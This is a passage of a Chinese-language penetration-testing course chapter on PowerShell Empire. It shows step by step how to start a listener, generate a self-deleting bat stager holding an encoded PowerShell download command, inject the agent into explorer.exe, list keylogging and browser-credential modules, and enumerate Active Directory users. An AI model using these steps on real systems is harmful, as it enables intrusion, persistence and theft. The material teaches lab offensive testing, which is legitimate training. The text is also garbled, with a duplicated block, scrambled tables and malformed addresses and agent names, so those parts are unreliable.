
(Empire: listeners/*) 执行 [*] 启动监听器 'http'

* 运行 Flask "http" (懒加载) * 环境: production

警告：不要在生产环境中使用开发服务器。

请改用生产 WSGI 服务器。调试模式关闭：

[+] 监听器启动成功！(Empire: listeners/http) > back (Empire: listeners) - usestager

multi/bash mash/launcher multi/macro/pythoninstaller multi/war os/appscript os/application os/ducky os/dylib os/jar
osx/launcher os/maccho os/macro
osx/pkg os/safari/launcher os/teeny windows/bunny windows/dll windows/ducky windows/hta
windows/launcher_bat windows/launcher_link windows/launcher_ct windows/launcher_vbs windows/launcher_xml
windows/macro windows/macroless_msword windows/teeny

## Listing 825 - 可用的阶段 (stagers)

如列表 825 所示，Empire 支持针对 Windows、Linux 和 OS X 的阶段。Windows 阶段包括对标准 DLL、HTML 应用程序、Microsoft Office 宏以及更奇特的格式的支持

(Empire: listeners) > usestager windows/launcher_bat (Empire: stager/windows/launcher_bat) > info
Name: BAT Launcher

Description:
为 Empire 生成一个自删除的 bat 启动器。

Options:

| 名称 | 必填 | Value |
| :--- | :--- | :--- |
| Listener | True | |
| OutputFile | False | /tmp/launcher.bat |

Description:
用于生成阶段的监听器。用于输出启动器的文件，否则显示在屏幕上。

> 723 (Hak5, 2019), https://hakshop.com/products/usb-rubber-ducky-deluxe
PWK 2.0 Copyright © Offensive Security Ltd. 保留所有权利。728

## Listing 826 - launcher_bat stager 的选项

我们可以使用 `set` 命令配置 `Listener` 参数，后面跟着我们刚刚创建的监听器名称。最后，我们将使用 `execute` 创建 stager，如列表 827 所示。

## Listing 827 - 创建 bat stager

为了更好地理解刚刚创建的阶段，让我们查看生成的 `launcher.bat` 文件的部分内容。

## Listing 828 - PowerShell Empire stager

stager 是 base64 编码的 PowerShell 命令。这个第一阶段负载将连接到监听器并获取剩余的 Empire agent 代码。

## 23.1.3 Empire Agent

现在我们的监听器已经运行，stager 也已就绪，我们需要在受害者机器上部署一个 agent。agent 仅仅是由 stager 获取的最终负载，它允许我们执行命令并与系统交互。stager（在此情况下为 .bat 文件）在完成执行后会删除自己并退出。

一旦 agent 在目标机器上运行，它将使用 HTTP GET 和 POST 请求的数据部分与监听器建立一个 AES 加密的通信通道。

使用 Kali Linux 2.0 进行渗透测试

![](img/dc318d3c28aa8a78cc9c5c8bcbf10f77_867_0.png)

- Obfuscate (混淆) 
- ObfuscateCommand (混淆命令)
- Language (语言)
- ProxyCreds (代理凭据)
- UserAgent (用户代理)
- Proxy (代理)
- DeleteStagerRetries (删除 stager 重试次数)
- False
- False
- True
- False
- False
- False False

Switch. Obfuscate 混淆启动器代码，使用 ObfuscateCommand 作为 powershell 的混淆类型。Token\All\1,Launcher\STDIN++\12467The Invoke-Obfuscate

```powershell

default

default

default

True 0

```

仅在 Obfuscate 开关为 True 时使用。仅限 powershell。要生成的 stager 的语言。用于请求的代理凭据 ([domain]\username:password)（默认，无或其他）。用于 stager 请求的 user-agent 字符串（默认，无或其他）。用于请求的代理（默认，无或其他）。

Switch. .bat after running 运行后删除 .bat 文件。stager 重试连接的次数。

Empire: stager/windows/launcher_bat > set Listener http (Empire: stager/windows/launcher_bat) > execute [*] Stager 输出已写入: /tmp/launcher.bat (Empire: stager/windows/launcher_bat) >

```bash

kali@kali:/Empire$ cat /tmp/launcher.bat

@echo off

start /b powershell -nop -sta -w 1 -enc SQBGCAgAgIABQAFMAGVBlHIAAcwBp... start /b "" cmd /c cdel .%%~f"&exit /b

```

PWK 2.0 Copyright Offensive Security Ltd. 保留所有权利。729

我们将 `launcher.bat` 脚本拷贝到 Windows 10 工作站并从命令行提示符执行它。

图 316：执行启动器

成功执行启动脚本后，初始 agent 调用将出现在我们的 Empire 会话中，如下：

Listing 829 - PowerShell Empire agent 连接

接下来，我们可以使用 `agents` 命令显示所有活跃的 agent。

## Listing 830 - PowerShell Empire agent 连接

现在我们可以使用 `interact` 命令后接 agent 名称与我们的 agent 交互并执行命令。

在这种情况下，我们将运行 `sysinfo` 来获取有关受侵害主机的信息（列表 831）。

使用 Kali Linux 2.0 进行渗透测试

![](img/dc318d3c28aa8a78cc9c5c8bcbf10f77_867_0.png)

- Obfuscate
- ObfuscateCommand
- Language
- ProxyCreds
- UserAgent
- Proxy
- DeleteStagerRetries
- False
- False
- True
- False
- False
- False

Switch. Obfuscate 混淆启动器代码，使用 ObfuscateCommand 作为 powershell 的混淆类型。Token\All\1,Launcher\STDIN++\12467The Invoke-Obfuscate

```powershell

default

default

default

True 0

```

仅在 Obfuscate 开关为 True 时使用。仅限 powershell。要生成的 stager 的语言。用于请求的代理凭据 ([domain]\username:password)（默认，无或其他）。用于 stager 请求的 user-agent 字符串（默认，无或其他）。用于请求的代理（默认，无或其他）。

Switch. .bat after running 运行后删除 .bat 文件。stager 重试连接的次数。

Empire: stager/windows/launcher_bat > set Listener http (Empire: stager/windows/launcher_bat) > execute [*] Stager 输出已写入: /tmp/launcher.bat (Empire: stager/windows/launcher_bat) >

```bash

kali@kali:/Empire$ cat /tmp/launcher.bat

@echo off

start /b powershell -nop -sta -w 1 -enc SQBGCAgAgIABQAFMAGVBlHIAAcwBp... start /b "" cmd /c cdel .%%~f"&exit /b

```

(Empire: S2Y5X1L) >

(Empire: S2Y5X1L) > ps

ProcessName ---------- Idle System ---------- explorer svchost

| PID | Arch | UserName | MemUsage |
| :--- | :--- | :--- | :--- |
| 0 | x86 | N/A | 0.00 MB |
| 4886 | x86 | N/A | 0.00 MB |
| 3568 | x86 | corp/offsec | 3.41 MB / 9.18 MB |

(Empire: S2Y5X1L) > psinject http 3568
[*] 已派遣 U9M3SBHG 运行 TASK, CMD, JOB\B
[*] Agent U9M3SBHG 已分配任务 ID 4
[*] 已派遣 U9M3SBHG 运行模块 powershell/management/job 已启动: BCMWAV
[*] Agent U9M3SBHG 返回了结果
[*] 正在向 10.11.02.22 发送 POWERSHELL (阶段 1)
[*] 新 agent DW29BAP 已签入
[*] 来自 10.11.02.22 的初始 agent DW29BAP 现在处于活跃状态 ([Slack]) 正在向 10.11.02.22 的 DW29BAP 发送 agent (阶段 2) --> (Empire: S2Y5X1L)

列表 833 - 注入 explorer.exe 进程

需要注意的是，与 meterpreter payload 的迁移功能不同，一旦进程迁移完成，原始的 Empire agent 仍然存在，我们必须手动切换到新创建的 agent，如下：

(Empire: DW29BAP) > agents

+   * Active

Name ---------- S2Y5X1L DW29BAPAP

agents:
| Name | Internal IP | Machine Name | Process | Delay |
| :--- | :--- | :--- | :--- | :--- |
| corp/offsec/powershell/2976 | 10.11.02.22 | CLIENT251 | ps | 5/0.0 |
| corp/offsec/explorer/3568 | 10.11.02.22 | CLIENT251 | ps | 5/0.0 |

(Empire: agents) > interact DW29BAPAP (Empire: DW29BAP) >

列表 834 - 切换到新 agent

## 23.1.3.1 练习

现在我们已经学习了 PowerShell Empire 的基本功能，请尝试完成以下练习以巩固知识。

-   1. 在你的 Kali 系统上安装并启动 PowerShell Empire。
-   2. 在 Kali 机器上创建一个 PowerShell Empire listener，并在 Windows 10 客户端上执行 stager。
-   3. 实验 PowerShell Empire agent 及其基本功能。

## 23.2 PowerShell 

Empire agent 的强大在于框架提供的各种模块。我们可以通过运行 `usemodule` 后接 T 和再接两个 A 来列出所有可用模块。

```
[Empire: S2X3W1]> usemodule

Display all 204 possibilities? (y or n) code_execution/invoke_webcam code_execution/invoke_metasploitpayload code_execution/ntsd_code_execution/invoke_reflectiveinjection_code_execution/invoke_shellcode code_execution/invoke_shellcodecollection/ChromeDump collection/FoxDump collection/USBKeylogger/WebcamRecorder collection/browser_data
```

列表 835 - PowerShell Empire 中的可用模块

这些模块被分为多个类别，但也包含了键盘记录、截图和文件下载等基本功能。

## 23.2.1 态势感知 (Situational Awareness)

让我们来看几个模块，看看它们包含什么。在本节中，我们将以 Active Directory 实验环境为目标。

首先，让我们探索 situational_awareness 类别。虽然有许多执行网络枚举的方法和命令，但该类别的重点是本地客户端和 Active Directory 枚举。

例如，我们可以获取 `user_module`，然后发布 `info` 命令来显示有关模块的信息（列表 836）。

注意此示例中的语法。要在“empire base prompt”中选择模块，我们需要包含模块的完整路径。如果我们不在该基础提示符下，则需要在模块路径加上 `powershell/`。

Active Directory 枚举模块位于网络子类别中，并带有 PowerView 前缀。这是对 @harmj0y 原始 Veil-PowerView^{24} 项目的引用。

(Empire: S2Y5X1L) > usemodule situational_awareness/network/powerview/get_user
(powershell/situational_awareness/network/powerview/get_user) > info

Name: Get-DomainUser
Module: powershell/situational_awareness/network/powerview/get_user

NeedsAdmin: False Opsec: True
Language: powershell MinLanguageVersion: 2
Background: True OutputExtension: None
Authors: @harmj0y
Description: 查询指定域中特定或多个用户的信息。
Options:
Name: Domain
LDAPFilter:
ServerLimit: 120
FindOne: False
TrustedToAuth: False False
Server: ...
PreauthRequired: False
Agent
True False

# S2Y5X1L

> (powershell/situational_awareness/network/powerview/get_user) execute job started: LP1URA
...
distinguishedname objectclass displayname logontime timestamp objectsid samaccountname codepageage samacounttype objectexpires

```
: CN=Jeff,Admin,O=Admins,OU=CorpUsers,DC=corp,DC=com :(top, person, organizationalPerson)

:Jeff_Admin

:2/19/2019 8:15:52 PM

:jeff_admin@corp.com

:Jeff_Admin

:S-1-5-21-304885246-323407088-72352474-1104 : jeff_admin

:1

:USER_OBJECT

:NEVER
```
